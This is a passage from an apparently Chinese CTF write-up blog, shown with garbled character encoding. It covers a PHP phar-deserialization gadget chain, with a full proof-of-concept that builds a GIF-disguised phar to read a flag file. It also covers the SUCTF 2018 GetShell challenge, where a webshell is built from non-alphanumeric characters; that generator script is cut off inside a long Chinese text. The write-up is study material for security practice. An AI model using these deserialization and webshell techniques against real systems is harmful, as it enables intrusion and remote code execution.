<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ini_set(<span class="string">&quot;open_basedir&quot;</span>, getcwd() . <span class="string">&quot;:/etc:/tmp&quot;</span>);</span><br><span class="line"><span class="comment">// åªèƒ½è¯»å†™ /etc å’Œ /tmp å’Œå½“å‰ç›®å½•(getcwd()) </span></span><br><span class="line"><span class="comment">// hint: å¿…é¡»è¦åœ¨delete.phpä¸­åˆ©ç”¨payload</span></span><br></pre></td></tr></table></figure>

<p><code>open_basedir</code> : æ˜¯PHPè®¾ç½®ä¸­ä¸ºäº†<strong>é˜²å¾¡PHPè·¨ç›®å½•è¿›è¡Œæ–‡ä»¶ï¼ˆç›®å½•ï¼‰è¯»å†™</strong>çš„æ–¹æ³•ï¼Œæ‰€æœ‰PHPä¸­æœ‰å…³æ–‡ä»¶è¯»ã€å†™çš„å‡½æ•°éƒ½ä¼šç»è¿‡open_basedirçš„æ£€æŸ¥ã€‚Open_basedirå®é™…ä¸Šæ˜¯ä¸€äº›ç›®å½•çš„é›†åˆï¼Œåœ¨<strong>å®šä¹‰äº†open_basedirä»¥åï¼Œphpå¯ä»¥è¯»å†™çš„æ–‡ä»¶ã€ç›®å½•éƒ½å°†è¢«é™åˆ¶åœ¨è¿™äº›ç›®å½•ä¸­</strong>ã€‚</p>
<p>è®¾ç½®open_basedirçš„æ–¹æ³•ï¼Œåœ¨linuxä¸‹ï¼Œä¸åŒçš„ç›®å½•ç”±â€œ:â€åˆ†å‰²ï¼Œå¦‚â€œ/var/www/:/tmp/â€ï¼›åœ¨Windowsä¸‹ä¸åŒç›®å½•ç”±â€œ;â€åˆ†å‰²ï¼Œå¦‚â€œc:/www;c:/windows/tempâ€ã€‚</p>
<p>ç¬¬<code>18</code>è¡Œä¸­: </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (strlen($filename) &lt; <span class="number">40</span> &amp;&amp; $file-&gt;open($filename) &amp;&amp; stristr($filename, <span class="string">&quot;flag&quot;</span>) === <span class="literal">false</span></span><br><span class="line">    <span class="comment">// åˆ¤æ–­æ–‡ä»¶åé•¿åº¦å°äº40 ,å¹¶ä¸”æ–‡ä»¶åä¸­ä¸èƒ½å«æœ‰flag å­—æ®µ</span></span><br><span class="line">    <span class="comment">// hint: flagçš„æ–‡ä»¶åä¸­å«æœ‰flagå­—æ®µ</span></span><br></pre></td></tr></table></figure>

<p>åœ¨Userç±»ä¸­å­˜åœ¨ close()æ–¹æ³•,åœ¨å¯¹è±¡é”€æ¯æ—¶æ‰§è¡Œ</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params">$func, $args</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    array_push(<span class="keyword">$this</span>-&gt;func, $func);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>FileListç±»ä¸­å­˜åœ¨<code>__call()</code> é­”æ³•å‡½æ•°,è¯¥ç±»æ²¡æœ‰close()æ–¹æ³•,å¦‚æœè¯¥ç±»å»è°ƒç”¨close()æ–¹æ³•,å°±ä¼šè§¦å‘<code>__call()</code>é­”æ³•å‡½æ•°</p>
<p>å¦‚æœèƒ½åˆ›å»ºä¸€ä¸ªuserçš„å¯¹è±¡ï¼Œå…¶dbå˜é‡æ˜¯ä¸€ä¸ªFileListå¯¹è±¡ï¼Œå¯¹è±¡ä¸­çš„æ–‡ä»¶åä¸ºflagçš„ä½ç½®ã€‚è¿™æ ·çš„è¯ï¼Œå½“userå¯¹è±¡é”€æ¯æ—¶ï¼Œdbå˜é‡çš„closeæ–¹æ³•è¢«æ‰§è¡Œï¼›è€Œdbå˜é‡æ²¡æœ‰closeæ–¹æ³•ï¼Œè¿™æ ·å°±ä¼šè§¦å‘callé­”æœ¯æ–¹æ³•ï¼Œè¿›è€Œå˜æˆäº†æ‰§è¡ŒFileå¯¹è±¡çš„closeæ–¹æ³•ã€‚é€šè¿‡åˆ†æFileListç±»çš„ææ„æ–¹æ³•å¯ä»¥çŸ¥é“ï¼Œcloseæ–¹æ³•æ‰§è¡Œåå­˜åœ¨resultså˜é‡é‡Œçš„ç»“æœä¼šåŠ å…¥åˆ°tableå˜é‡ä¸­è¢«æ‰“å°å‡ºæ¥ï¼Œä¹Ÿå°±æ˜¯flagä¼šè¢«æ‰“å°å‡ºæ¥ã€‚</p>
<p>å½“ä¸Šä¼ pharåç¼€çš„æ–‡ä»¶æ—¶, <code>&#123;&quot;success&quot;:false,&quot;error&quot;:&quot;Only gif\/jpg\/png allowed&quot;&#125;</code></p>
<p>ä½†æ˜¯è¿™ä¸€ç‚¹æ— å½±å“,<strong>åªè¦å†…å®¹æ˜¯phar æ–‡ä»¶çš„å„å¼, ä¸ç®¡ä¸Šä¼ ä»€ä¹ˆåç¼€çš„æ–‡ä»¶éƒ½ä¼šè¢«è§£æä¸ºpharæ–‡ä»¶</strong></p>
<p>POC: </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $db;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $files;</span><br><span class="line">    <span class="keyword">private</span> $results;</span><br><span class="line">    <span class="keyword">private</span> $funcs;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $file = <span class="keyword">new</span> File();</span><br><span class="line">        $file-&gt;filename = <span class="string">&#x27;/flag.txt&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files = <span class="keyword">array</span>($file);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">@unlink(<span class="string">&quot;expexp.phar&quot;</span>);</span><br><span class="line"><span class="comment">// ä¸‹é¢è¿™éƒ¨åˆ†æ˜¯phar ååºåˆ—éƒ½éœ€è¦å†™çš„, è§†æƒ…å†µæ”¹åŠ¨</span></span><br><span class="line">$o = <span class="keyword">new</span> User();</span><br><span class="line">$o-&gt;db = <span class="keyword">new</span> FileList();</span><br><span class="line"><span class="keyword">echo</span> serialize($o);</span><br><span class="line"></span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">&quot;expexp.phar&quot;</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">&quot;GIF89a&quot;</span> . <span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line">$phar-&gt;setMetadata($o);</span><br><span class="line">$phar-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">// æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200225234937.png"></p>
<p>å‚è€ƒèµ„æ–™: </p>
<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html">https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.suk1.top/2020/01/16/BuuctfDay7/">https://www.suk1.top/2020/01/16/BuuctfDay7/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/kevinbruce656/p/11316070.html">https://www.cnblogs.com/kevinbruce656/p/11316070.html</a></p>
<h1 id="SUCTF-2018-GetShell"><a href="#SUCTF-2018-GetShell" class="headerlink" title="[SUCTF 2018]GetShell"></a>[SUCTF 2018]GetShell</h1><p>é¢˜ç›®ç»™å‡ºäº†ä¸€äº›æºç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($contents = file_get_contents($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>])) &#123; <span class="comment">// å°†æ–‡ä»¶å†…å®¹ä»¥å­—ç¬¦ä¸²çš„å½¢å¼è¯»å…¥å˜é‡contents</span></span><br><span class="line">    $data = substr($contents, <span class="number">5</span>); <span class="comment">// ä»å­—ç¬¦ä¸²çš„ç¬¬6ä¸ªä½ç½®å¼€å§‹,æˆªå–ä¹‹åçš„å†…å®¹èµ‹å€¼ç»™å˜é‡data</span></span><br><span class="line">    <span class="keyword">foreach</span> ($black_char <span class="keyword">as</span> $b) &#123; <span class="comment">// éå†é»‘åå•å¹¶èµ‹å€¼ç»™å˜é‡b</span></span><br><span class="line">        <span class="keyword">if</span> (stripos($data, $b) !== <span class="literal">false</span>) &#123; <span class="comment">// å¦‚æœå˜é‡data ä¸­å­˜åœ¨é»‘åå•ä¸­çš„å­—æ®µ,å°±ä¸Šä¼ å¤±è´¥</span></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;illegal char&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæˆ‘é¡ºä¾¿ä¸Šä¼ äº†å‡ ä¸ªæ–‡ä»¶,éƒ½ä¸è¡Œ,å½“ä¸Šä¼ ä¸€ä¸ªæ²¡æœ‰å†…å®¹çš„shell.phpæ—¶,æˆåŠŸä¸Šä¼ </p>
<p>è¿”å›çš„æ–‡ä»¶è·¯å¾„æ˜¯32ä½çš„hash,å¹¶ä¸”å›ºå®šä¸å˜,æ— è®ºä¸Šä¼ ä»€ä¹ˆæ–‡ä»¶åç¼€éƒ½ä¸º<code>.php</code></p>
<p>å½“ä»€ä¹ˆéƒ½ä¸ä¸Šä¼ çš„æ—¶å€™,ç‚¹å‡»æäº¤ , å°±è¿”å›<code>Return Code: 4</code>  ä¸çŸ¥é“æ˜¯ä¸æ˜¯hint</p>
<p>å¯¹ä¸Šä¼ çš„å†…å®¹è¿›è¡Œfuzz(fuzz å­—å…¸ä¸ºé”®ç›˜ä¸Šçš„æ‰€æœ‰å¯æ‰“å°å­—ç¬¦). å‘ç°åªæœ‰<code>[]</code> <code>_</code> <code>()</code> <code>$</code> <code>~</code>å¯ä»¥ä¸Šä¼  æ‰€ä»¥å¾ˆæ˜æ˜¾æ˜¯ç”¨<del>å’Œä¸å¯æ˜¾å­—ç¬¦å†™webshell,éœ€è¦åˆ©ç”¨phpçš„ä½è¿ç®—,æ¥æ„é€ ä»£ç æ‰§è¡Œå‡½æ•° ,å…¶ä¸­ $ ä½¿ç”¨æ¥å£°æ˜å˜é‡çš„, å…¶ä»–æ˜¯ç”¨æ¥å®šä¹‰å‡½æ•°çš„æ—¶å€™ç”¨çš„,åœ¨ISO-8859-15 ç¼–ç ä¸‹è¿›è¡Œä¿å­˜,`</del><code> å¯ç”¨æ¥è¿›è¡Œ</code>å–å<code>æ“ä½œ,è¿›è€Œæ„é€ å‡ºæˆ‘ä»¬éœ€è¦çš„å­—ç¬¦çœ‹äº†wpå,å‘ç°</code>. ;` ä¹Ÿå¯ä»¥ä¸Šä¼ ,ä½†æ˜¯ä¸ºä»€ä¹ˆæˆ‘ç”¨bp FUZZçš„æ—¶å€™å°±ä¸è¡Œå‘¢?å¯¼è‡´æˆ‘ä»¥ä¸ºè¿˜è¦ç”¨ä¸Šé¢é‚£å‡ ä¸ªå»æ„é€ . å’Œ ;  </p>
<p>çœ‹äº†ä¸€ç¯‡æ–‡ç« å,çŸ¥é“äº†åŸå› : è¦æŠŠpayload encoding å“ªé‡Œå–æ¶ˆæ‰(ä¸ç„¶ä¼šå› ä¸ºå­—ç¬¦ç¼–ç æ— æ³•å¾—åˆ°æ­£ç¡®çš„ç™½åå•), ç„¶ååœ¨ grep match å‹¾é€‰,è¿™æ ·fuzz å°±èƒ½å¿«é€Ÿæ‰¾åˆ°åˆæ³•çš„å­—ç¬¦äº†</p>
<p>è¿˜æœ‰<code>éè‹±æ–‡å­—ç¬¦</code> ä¹Ÿå¯ä»¥ä¸Šä¼ </p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200228111130.png"></p>
<p><code>~(X) å½“Xä¸ºä¸€ä¸ªæ±‰å­—æ—¶å¯¹è¿™ä¸ªæ±‰å­—å–åç¬¬äºŒä½å¯ä»¥å¾—åˆ°å¾—åˆ°ä¸€ä¸ªè‹±æ–‡å­—ç¬¦</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200228144952.png"></p>
<p>è¿˜æœ‰ä¸€ä¸ªå° <code>trick</code></p>
<p>åœ¨PHPä¸­ï¼Œå¦‚æœ<strong>å¼ºåˆ¶è¿æ¥æ•°ç»„å’Œå­—ç¬¦ä¸²çš„è¯ï¼Œæ•°ç»„å°†è¢«è½¬æ¢æˆå­—ç¬¦ä¸²</strong>ï¼Œå…¶å€¼ä¸º<code>Array</code></p>
<p>ç¬¬ä¸€ä¸ªå­—æ¯æ˜¯å¤§å†™A, ç¬¬å››ä¸ªå­—æ¯ä¸ºå°å†™a, å¦‚æœé¢˜ç›®å…è®¸ <code>+</code> çš„è¯, å¯ä»¥åˆ©ç”¨ è‡ªå¢è¿ç®—ç¬¦,æ¥è·å¾—æ‰€æœ‰å­—æ¯</p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200228144912.png"></p>
<p>ç„¶åæ„é€ å‡½æ•°æ‰§è¡Œå³å¯.</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>); <span class="comment">// å…³é—­æŠ¥é”™,ä¸ç„¶å‡ºç°ä¸€å †notice å¾ˆçƒ¦</span></span><br><span class="line">header(<span class="string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);</span><br><span class="line"></span><br><span class="line">$dic = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;)&#x27;</span>];</span><br><span class="line"></span><br><span class="line">$str = <span class="string">&quot;æ¯ä¸€æ¬¡å›å®¶,æ¯æ¬¡éƒ½ä¼šæœ‰ä¸åŒçš„æ„Ÿæ‚Ÿ,è¿™æ„Ÿæ‚Ÿä¸å…‰æ˜¯æ¥è‡ªæˆ‘å…¶ä»–å­¦æ ¡çš„å¥½æœ‹å‹çš„ä¸€äº›ç”Ÿæ´»åˆ†äº«,ä¹Ÿæ¥è‡ªè‡ªæˆ‘çš„ä½“éªŒ.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">å°±å¦‚æˆ‘çš„æ ‡é¢˜æ‰€è¨€â€”-â€œåªä¸è¿‡æ˜¯æœ‰äººæ›¿æˆ‘(ä»¬)è´Ÿé‡å‰è¡Œâ€,çœŸçš„å¾ˆæ„Ÿè°¢ä»–ä»¬,ä½†æ˜¯æœ‰æ—¶å€™æœ‰å¸Œæœ›è‡ªå·±èƒ½åšå‡ºäº›äº‹æƒ…æ¥æ”¹å˜,å¸Œæœ›è´Ÿé‡çš„æ˜¯æˆ‘ä»¬.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">åœ¨çŸ¥ä¹ä¸Šçœ‹åˆ°çš„,è§‰å¾—å¾ˆæœ‰é“ç†,è¿™é‡Œå°±ç›´æ¥copyè¿‡æ¥å§.æ–‡æœ«æ³¨æ˜å‡ºå¤„</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">ä½ å­¦ä¹ ä¸€èˆ¬ï¼Œè€ƒä¸Šäº†ç°åœ¨çš„è¿™æ‰€å­¦æ ¡ï¼Œæˆç»©ä¸ç®—å¥½ï¼Œæ‹¿ä¸åˆ°å¥–å­¦é‡‘ï¼Œä¸Šè¯¾ä¸å¬è®²ï¼Œä¸Šè‡ªä¹ ä¸è§„å¾‹,è€ƒè¯•é çªå‡»ï¼ŒåŒå­¦å¸®ä¸€æŠŠçš„è¯ä¹Ÿèƒ½æ¯ç§‘è€ƒåˆ°ä¸ƒå…«ååˆ†ï¼Œä½†æ˜¯ä¸ä¼˜ç§€æ€»æœ‰å¾ˆå¤§è·ç¦»ã€‚</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">ä½ å®¶å¢ƒä¸€èˆ¬ï¼Œçˆ¶æ¯éƒ½æ˜¯æ™®é€šå‘˜å·¥ï¼Œä½ åœ¨è¿™ä¸ªåŸå¸‚çš„ç”Ÿæ´»è´¹æ˜¯æ¯æœˆä¸€åƒäºŒï¼Œæ²¡äº‹ä¸‹ä¸‹é¦†å­,ä¸€ä¸ªæœˆæ·»ä»¶è¡£æœï¼Œæƒ³ä¹°å°ç›¸æœºï¼Œå’¬å’¬ç‰™æ‰èƒ½ä¹°åŒè‡ªå·±å–œæ¬¢çš„é‹ã€‚</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">ä½ å‡ ä¹æ²¡æœ‰ç‰¹é•¿ï¼Œä¸ä¼šå¼¹å‰ä»–ï¼Œä¸ä¼šå¼¹é’¢ç´ï¼Œä¸ä¼šè·³èˆï¼Œä¸ä¼šç”»ç”»ï¼Œæƒ³å­¦æ‘„å½±å´ä¸ä¼šä½¿ç”¨å›¾ç‰‡å¤„ç†è½¯ä»¶ï¼Œæƒ³ä¸Šå°æ¼”å‡ºå´æ²¡ä¿¡å¿ƒï¼Œå­¦æ ¡æ™šä¼šæ¯”èµ›çš„æ—¶å€™ï¼Œä½ ç»å¸¸æ˜¯ç«™åœ¨å°ä¸‹å›´è§‚çš„äººç¾¤é‡Œçš„ä¸€å‘˜ï¼Œä½ ä¸èšå…‰ç¯ç¯ç»•çš„èˆå°å‡ ä¹ç»ç¼˜ã€‚</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">ä½ çš„æ„Ÿæƒ…ä¹Ÿæ˜¯ä¸€èˆ¬ï¼Œæœ‰æ—¶å€™ä¼šé‡è§è‡ªå·±å¿ƒä»ªçš„é‚£ä¸ªäººï¼Œä½†æ˜¯æ€»æŠ“ä¸ä½æœºä¼šï¼Œçœ¨çœ¼é—´é‚£ä¸ªäººå°±è¢«å…¶ä»–äººä¿˜è·ï¼Œä½ å°±å¼€å§‹ä¼¤å¿ƒã€æŠ±æ€¨ï¼Œä½†æ˜¯å‡ å¤©ä¹‹ååˆå¼€å§‹å¯»æ‰¾æ–°çš„å¿ƒä¸Šäººï¼Œå°±è¿™æ ·çœ‹ç€ä¸€ä¸ªä¸ªå¿ƒä¸Šäººèµ°è¿‡ï¼Œç›´åˆ°ä½ æ¯•ä¸šï¼Œä¸å…¶ä¸­ä»»ä½•ä¸€ä¸ªéƒ½æ²¡æœ‰å‘å±•ã€‚</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">æ€»ä¹‹ï¼Œä½ æ²¡æœ‰ä»€ä¹ˆç‰¹åˆ«çš„åœ°æ–¹ ï¼Œå°±å’Œå‘¨å›´çš„åƒä¸‡ä¸ªæ™®é€šäººä¸€æ ·ã€‚</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">ä½ ä¸ç”˜å¿ƒæ‹¿ä¸åˆ°å¥–å­¦é‡‘ï¼Œçœ‹è§åˆ«äººå¾—å¥–å­¦é‡‘çš„æ—¶å€™ä½ ä¼šè¯´é‚£å®Œå…¨æ˜¯çªå‡»çš„ç»“æœï¼Œäºæ˜¯ä½ å¼€å§‹ä¸Šè‡ªä¹ ï¼Œä¸è¿‡ä½ åªåšæŒäº†ä¸€æ˜ŸæœŸã€‚</span></span><br><span class="line"><span class="string">ä½ ä¸ç”˜å¿ƒè‡ªå·±çš„çˆ¶è¾ˆå¹³å¹³ï¼Œäºæ˜¯ä½ æ‰¹è¯„è®½åˆºè‡ªå·±å‘¨å›´çš„â€œå®˜äºŒä»£â€ã€â€œå¯ŒäºŒä»£â€ï¼Œç«‹å¿—è¦åŠªåŠ›å­¦ä¹ äº‰å–æˆåŠŸï¼Œä¹Ÿå¥½è®©è‡ªå·±çš„å­©å­æˆä¸ºâ€œå¯ŒäºŒä»£â€ï¼Œä½ çš„çƒ­æƒ…æŒç»­äº†ä¸€ä¸ªæ˜ŸæœŸã€‚</span></span><br><span class="line"><span class="string">ä½ ä¸ç”˜å¿ƒè‡ªå·±ä»€ä¹ˆç‰¹é•¿éƒ½æ²¡æœ‰ï¼Œäºæ˜¯ä½ å¼€å§‹å­¦å¼¹å‰ä»–ã€ä¹°æ»‘è½®é‹ã€å€Ÿæ¥æ‘„å½±æ–¹é¢çš„ä¹¦ç±ï¼Œä½ å¯¹ç€é•œå­å¾®ç¬‘ç€è¯´ï¼šâ€œä½ æ˜¯æœ€æ£’çš„ã€‚â€ è¿™ä»½è™šå‡çš„ä¿¡å¿ƒç»´æŒäº†ä¸€ä¸ªæ˜ŸæœŸã€‚</span></span><br><span class="line"><span class="string">ä½ ä¸ç”˜å¿ƒè‡ªå·±æ²¡æœ‰ä¼´ä¾£ï¼Œä½ å†³å¿ƒæ´—å¿ƒé©é¢é‡æ–°åšäººï¼Œä½ åˆ æ‰ç”µè„‘é‡Œçš„å¶åƒå‰§è‚¥çš‚å‰§ï¼Œä½ æ”¶æ‹¾èµ·åºŠä¸Šçš„æ‡’äººæ¡Œï¼ŒæŠŠé›¶é£Ÿè¢‹å­ç»Ÿç»Ÿæ‰”æ‰ï¼Œç„¶åæ´—äº†ä¸ªæ¾¡å¹¶ä¸”ä¿®é¥°äº†ä¸€ä¸‹è‡ªå·±ï¼Œä½ å¾€å‘å‹ä¸Šå–·äº†å•«å–±æ°´ï¼Œå¥½è®©è‡ªå·±çœ‹èµ·æ¥å¾ˆç²¾ç¥ï¼Œä½ æ€€æ£ç€ä¸€æœ¬æˆåŠŸå­¦çš„ä¹¦å†³å®šå‡ºå»èµ°èµ°ï¼Œå¼€å§‹æ–°çš„ç”Ÿæ´»ã€‚è¿™æ ·çš„çŠ¶æ€ï¼Œä½ ç¨€ç¨€æ‹‰æ‹‰åœ°åšæŒäº†ä¸€ä¸ªæ˜ŸæœŸã€‚</span></span><br><span class="line"><span class="string">ä¸€ä¸ªæ˜ŸæœŸä¹‹åï¼Œä½ è¿˜æ˜¯å’Œå‘¨å›´åƒä¸‡ä¸ªäººä¸€æ ·ï¼Œä½ è¿˜æ˜¯å’Œä¸€æ˜ŸæœŸå‰çš„è‡ªå·±ä¸€æ ·ã€‚</span></span><br><span class="line"><span class="string">ä½ é€›ç½‘ç»œè®ºå›ï¼Œçœ‹åˆ°äº†è¿™æ ·ä¸€å¥è¯ï¼šâ€œäºŒåå²æ˜¯äººç”Ÿæœ€ç¾å¥½çš„æ—¶å…‰ï¼Œä¸åº”è¯¥å±€é™åœ¨å­¦æ ¡é‡Œæ•™å®¤é‡Œï¼Œåº”è¯¥äº«å—ç”Ÿæ´»ã€‚â€ äºæ˜¯ä½ ç›¸ä¿¡äº†ï¼Œä½ è§‰å¾—äºŒåå²çš„ä½ å°±åº”è¯¥â€œéšå¿ƒæ‰€æ¬²â€ï¼Œäº«å—â€œäººç”Ÿä¸­æœ€åçš„è‡ªç”±æ—¶å…‰â€ï¼›å°±åº”è¯¥â€œå¿«ä¹åœ°å»æ‹çˆ±â€â€œé£åæ­£èŒ‚â€â€œæŒ¥æ–¥æ–¹é’â€Â·Â·Â·Â·Â·Â·</span></span><br><span class="line"><span class="string">ç°åœ¨çš„ä½ ï¼Œç”¨ç€çˆ¶æ¯çš„è¡€æ±—é’±ï¼Œç”¨ç€åç‰ŒåŒ…ã€ç©¿ç€åç‰Œè·‘é‹ã€éª‘ç€æ·å®‰ç‰¹å±±åœ°è½¦ã€ç”¨ç€ä½³èƒ½ç‰Œçš„ç›¸æœºå’Œè‹¹æœç‰Œçš„æ‰‹æœºï¼Œè¿˜ç»å¸¸å»æ˜Ÿå·´å…‹å–å–å’–å•¡ä½“éªŒä¸€ä¸‹å°èµ„æƒ…è°ƒÂ·Â·Â·Â·Â·Â·</span></span><br><span class="line"><span class="string">é‚£ä¹ˆï¼Œè¯·å…è®¸æˆ‘çŒœæµ‹ä¸€ä¸‹ä½ çš„æœªæ¥â€”â€”</span></span><br><span class="line"><span class="string">åœ¨å¤§å››å°†è¦ç»“æŸæ—¶ï¼Œä½ è€ƒç ”è½æ¦œã€‚ä½ é£é£ç«ç«çš„å‚åŠ æ ¡å›­æ‹›è˜ä¼šï¼Œå¾ˆå¤šå…¬å¸ä½ éƒ½çœ‹ä¸ä¸Šï¼Œå«Œä»–ä»¬ä¸æ˜¯ä½“åˆ¶å†…å•ä½ã€å¹³å°çª„ã€è§„æ¨¡å°ï¼Œç›´åˆ°æ¯•ä¸šï¼Œä½ è¿˜æ²¡æœ‰æ‰¾åˆ°å¿ƒä»ªçš„å·¥ä½œã€‚ä½ æ”¶æ‹¾å¥½è¡Œæå›åˆ°è€å®¶ï¼Œçˆ¶æ¯è®©ä½ è¯•ç€å‚åŠ å„ç§æ‹›è˜è€ƒè¯•æˆ–è€…å‚åŠ å½“åœ°çš„åº”è˜ä¼šï¼Œä½ ä¸å»ï¼Œå› ä¸ºä½ è§‰å¾—é‚£äº›å·¥ä½œå¤ªç®€å•äº†ï¼Œä¸é€‚åˆä½ ï¼Œä½ åº”è¯¥å»å¯»æ‰¾æ›´å¥½çš„å°±ä¸šæœºä¼šã€‚å¯æ˜¯ï¼Œå½“ä½ å»é‚£äº›ä½ çœ‹å¾—ä¸Šçš„å…¬å¸åº”è˜æ—¶ï¼Œä½ 